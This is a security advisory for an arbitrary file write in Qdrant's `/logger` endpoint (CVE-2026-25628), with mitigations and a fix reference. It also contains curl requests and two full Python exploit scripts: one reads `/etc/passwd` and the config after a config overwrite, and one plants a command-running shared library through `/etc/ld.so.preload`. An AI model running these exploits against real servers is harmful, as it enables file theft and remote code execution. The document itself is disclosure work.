# [H] qdrant has arbitrary file write via `/logger` endpoint

## Summary
Severity: High
Advisory: GHSA-f632-vm87-2m2f
CVE: CVE-2026-25628
CWE: CWE-73
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-f632-vm87-2m2f
Type: github-advisory

## Affected
- crates.io: `qdrant` — affected >=1.9.3 <1.15.6

## Details
### Summary
It is possible to append to arbitrary files via /logger endpoint. Minimal privileges are required (read-only access). Tested on Qdrant 1.15.5

### Details
`POST /logger`
([Source code link](https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195))
endpoint accepts an attacker-controlled `on_disk.log_file` path.

There are no authorization checks (but authentication check is present).

This can be exploited in the following way: if configuration directory is writable and `config/local.yaml` does not exist, set log path to `config/local.yaml` and send a request with a log injection payload. The`PATCH /collections` endpoint was used with an invalid collection name to inject valid yaml.

After running the PoC, the content of `config/local.yaml` will be:

```yaml
2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 "POST /logger HTTP/1.1" 200 57 "-" "python-requests/2.32.5" 0.009422
2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui
service:
    static_content_dir: ..

2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 "PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1" 404 113 "-" "python-requests/2.32.5" 0.001391
```

Some junk log lines are present, but they don't matter as this is still valid yaml.

After that, if qdrant is restarted (via legitimate means or by a OOM/crash), then `local.yaml` config will have higher priority and `service.static_content_dir` will be set to `..`. In a container environment, this allows one to read all files via the web UI path.

Also overriding config file may let the attacker raise its privileges with a custom master key (remember that lowest privileges are required to access the vulnerable endpoint).

Relevant requests:

1. Enable on-disk logging to the config file:

```bash
curl -sS -X POST "http://localhost:6333/logger" \
  -H "Content-Type: application/json" \
  -d '{
    "log_level":"INFO",
    "on_disk":{
      "enabled":true,
      "format":"text",
      "log_level":"INFO",
      "buffer_size_bytes":1,
      "log_file":"config/local.yaml"
    }
  }'
```

2. Inject YAML via a request that logs newlines (URL-encoded):

```bash
curl -sS -X PATCH "http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a" \
  -H "Content-Type: application/json" \
  -d '{}'
```

### Full reproduction instructions

1. Start Qdrant with a writable configuration directory:

```sh
sudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5
```

2. Run the exploit:

```sh
% python3 exploit.py --url http://localhost:6333
[+] Logger configured
[+] Log injection successful
[+] Logger disabled
Restart Qdrant cluster and press Enter to continue...
```

3. Restart the container:

```sh
sudo docker restart qdrant-poc
```

4. Resume the exploit:

```sh
<press Enter>
[+] Passwd file retrieved
--------------------------------
...
--------------------------------
[+] Config file retrieved
--------------------------------
...
```

## Mitigation

1. Limit usage of `/logger` endpoint to users with management privileges only (or better disable it completely).
2. Restrict the path of the log file to a dedicated logs directory.

This vulnerability does not affect Qdrant cloud as the configuration directory is not writable.

## Exploit code

### `exploit_privesc.py`

```python
import requests
import sys
import argparse

parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
parser.add_argument("--api-key", required=False, help="API key")

args = parser.parse_args()

url = args.url

headers = {}
if args.api_key:
    headers["api-key"] = args.api_key

s = requests.Session()

s.headers.update(headers)

res = s.post(
    f"{url}/logger",
    json={
        "log_level": "INFO",
        "on_disk": {
            "enabled": True,
            "format": "text",
            "log_level": "INFO",
            "buffer_size_bytes": 1,
            "log_file": "config/local.yaml",
        },
    },
)
res.raise_for_status()
print("[+] Logger configured")


res = s.patch(
    f"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a",
    json={},
)
error = res.json()["status"]["error"]

if "doesn't exist!" in error:
    print("[+] Log injection successful")
else:
    print(f"[-] Error: {error}")
    sys.exit(1)

res = s.post(
    f"{url}/logger",
    json={
        "on_disk": {
            "enabled": False,
        },
    },
)
res.raise_for_status()
print("[+] Logger disabled")

input("Restart Qdrant cluster and press Enter to continue...")

res = s.get(f"{url}/dashboard/etc/passwd")
res.raise_for_status()
print("[+] Passwd file retrieved")
print("--------------------------------")
print(res.text)
print("--------------------------------")

res = s.get(f"{url}/dashboard/qdrant/config/config.yaml")
res.raise_for_status()
print("[+] Config file retrieved")
print("--------------------------------")
print(res.text)
print("--------------------------------")
```

## `exploit_rce.py`

```python
import requests
import argparse
import tempfile
import os

TEST_COLLECTION_NAME = "COLTEST"


parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
parser.add_argument("--api-key", required=False, help="API key")
parser.add_argument("--cmd", default="touch /tmp/touched_by_rce")
parser.add_argument("--lib", default="")

args = parser.parse_args()


assert "'" not in args.cmd, "Command must not contain single quotes"
so_code = """
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unlink("/etc/ld.so.preload");
    system("/bin/bash -c 'XXXXXXXX'");
}
""".replace('XXXXXXXX', args.cmd)

with tempfile.TemporaryDirectory() as tmpdir:
    with open(f"{tmpdir}/cmd_code.c", "w") as f:
        f.write(so_code)
    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')
    cmd_so = open(f'{tmpdir}/cmd.so', "rb").read()

url = args.url

headers = {}
if args.api_key:
    headers["api-key"] = args.api_key

s = requests.Session()

s.headers.update(headers)

res = s.post(
    f"{url}/logger",
    json={
        "log_level": "INFO",
        "on_disk": {
            "enabled": True,
            "format": "text",
            "log_level": "INFO",
            "buffer_size_bytes": 1,
            "log_file": "/etc/ld.so.preload",
        },
    },
)
res.raise_for_status()
print("[+] Logger configured")

res = s.get(
    f"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so",
)

print("[+] Log injected")


res = s.post(
    f"{url}/logger",
    json={
        "on_disk": {
            "enabled": False,
        },
    },
)
res.raise_for_status()
print("[+] Logger disabled")


rsp = s.post(f"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload", files={"snapshot": ("hui.so", cmd_so, "application/octet-stream")})

print(rsp.text)
# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`

input("Press Enter to continue...")
rsp = s.get(f"{args.url}/stacktrace")
rsp.raise_for_status()
```

### Impact
Remote code execution.

## References
- https://github.com/qdrant/qdrant/security/advisories/GHSA-f632-vm87-2m2f
- https://nvd.nist.gov/vuln/detail/CVE-2026-25628
- https://github.com/qdrant/qdrant/commit/32b7fdfb7f542624ecd1f7c8d3e2b13c4e36a2c1
- https://github.com/qdrant/qdrant
- https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195
